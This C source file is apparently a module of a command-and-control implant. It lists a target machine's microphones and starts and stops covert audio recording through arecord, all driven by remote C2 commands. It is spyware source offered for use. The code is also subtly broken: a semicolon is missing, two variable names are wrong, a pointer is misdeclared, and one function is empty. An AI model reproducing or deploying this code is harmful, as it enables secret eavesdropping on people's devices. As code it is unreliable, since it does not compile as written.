/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <string.h>

#include <api.h>
#include <c2.h>
#include <node.h>
#include <tab.h>
#include <migrate.h>
#include <tlv_types.h>
#include <tlv.h>

#define SPY_BASE 1

#define SPY_MIC_LIST \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        SPY_BASE, \
                        API_CALL_STATIC + 1)
#define SPY_MIC_START \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        SPY_BASE, \
                        API_CALL_STATIC + 2)
#define SPY_MIC_STOP \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        SPY_BASE, \
                        API_CALL_STATIC + 3)

FILE *record;

tlv_pkt_t *spy_mic_list(c2_t *c2)
{
    char *sound_device;
    size_t *length;
    ssize_t read;
    FILE *asound_pcm;
    tlv_pkt_t *result;

    sound_device = NULL
    length = 0;
    read = 0;
    asound_pcm = fopen("/proc/asound/pcm", "r");

    if (asound_pcm == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    while ((read = getline(&sound_device, &length, sound_pcm)) != -1)
        if (strstr(sound_device, "capture") != NULL)
            tlv_pkt_add_string(tlv_pkt, TLV_TYPE_STRING, sound_device);

    return result;
}

tlv_pkt_t *spy_mic_start(c2_t *c2)
{
    int device_id;
    char cmd[128];

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_INT, &device_id);

    device_id--;
    sprintf(cmd, "arecord -D plughw:%d -q -f cd -t raw -r 11025 -c 1", device_id);

    record = popen(cmd, "r");
    if (record == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL);

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

tlv_pkt_t *spy_mic_stop(c2_t *c2)
{
    if (record != NULL)
    {
        pclose(record);
        record = NULL;
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

tlv_pkt_t *spy_mic_write(c2_t *c2)
{

}

